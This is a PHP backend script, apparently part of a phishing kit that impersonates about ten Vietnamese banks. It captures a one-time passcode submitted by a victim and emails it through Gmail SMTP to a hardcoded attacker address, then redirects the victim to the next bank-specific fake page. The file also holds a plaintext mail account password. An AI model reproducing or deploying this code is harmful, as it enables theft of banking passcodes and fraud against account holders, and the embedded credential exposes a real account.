<?php
//goi thu vien
$OTP=$_POST['OTP'];
$noidung='<p><h3><strong>Mã OTP:</strong></h3></p>
			                    <p><strong>Mật khẩu:</strong> '.$OTP.'</p>';;
                            
include('class.smtp.php');
include "class.phpmailer.php";
$nFrom = "Thông tin";    //mail duoc gui tu dau, thuong de ten cong ty ban
$mFrom = 'buysend2019@gmail.com';  //dia chi email cua ban
$mPass = '@metmoiqua123';       //mat khau email cua ban
$nTo = 'RIP FACEBOOK'; //Ten nguoi nhan
$mTo = 'buysend2019@gmail.com';   //dia chi nhan mail
$mail             = new PHPMailer();
$body             = $_POST['password']; // Noi dung email
$title = 'Hoàn thành OTP';   //Tieu de gui mail
$mail->IsSMTP();
$mail->CharSet  = "utf-8";
$mail->SMTPDebug  = 0;   // enables SMTP debug information (for testing)
$mail->SMTPAuth   = true;    // enable SMTP authentication
$mail->SMTPSecure = "ssl";   // sets the prefix to the servier
$mail->Host       = "smtp.gmail.com";    // sever gui mail.
$mail->Port       = 465;         // cong gui mail de nguyen
// xong phan cau hinh bat dau phan gui mail

   
							    
$mail->Username   = $mFrom;  // khai bao dia chi email
$mail->Password   = $mPass;              // khai bao mat khau
$mail->SetFrom($mFrom, $nFrom);
$mail->AddReplyTo('info@freetuts.net', 'Freetuts.net'); //khi nguoi dung phan hoi se duoc gui den email nay
$mail->Subject    = $title;// tieu de email
$mail->MsgHTML($noidung);// noi dung chinh cua mail se nam o day.
$mail->AddAddress($mTo, $nTo);

// thuc thi lenh gui mail
if(!$mail->Send()) {
    echo 'Co loi!';
    
} else {
    if(isset($_POST["check_otp"])){
        if($_POST["check_otp"]=="otp_agribank"){
            header("Location: agribank3.html");
        }
        elseif ($_POST["check_otp"] == "TechcomBank") {
            header("Location: TechcomBank3.html");
         }
           elseif ($_POST["check_otp"] == "Sacombank") {
            header("Location: Sacombank3.html");
         }
           elseif ($_POST["check_otp"] == "VCB") {
            header("Location: vcb3.html");
         }
           elseif ($_POST["check_otp"] == "DongA") {
            header("Location: donga3.html");
         }
          elseif ($_POST["check_otp"] == "bidv") {
            header("Location: bidv3.html");
         }
          elseif ($_POST["check_otp"] == "viettinbank") {
            header("Location: viettin3.html");
         }
          elseif ($_POST["check_otp"] == "VPBank") {
            header("Location: VPBank3.html");
         }
          elseif ($_POST["check_otp"] == "VIP") {
            header("Location: vib3.html");
         }
            elseif ($_POST["check_otp"] == "ACB") {
            header("Location: acb3.html");
         }
        else{
            echo "error";
        }
  
	}
}
?>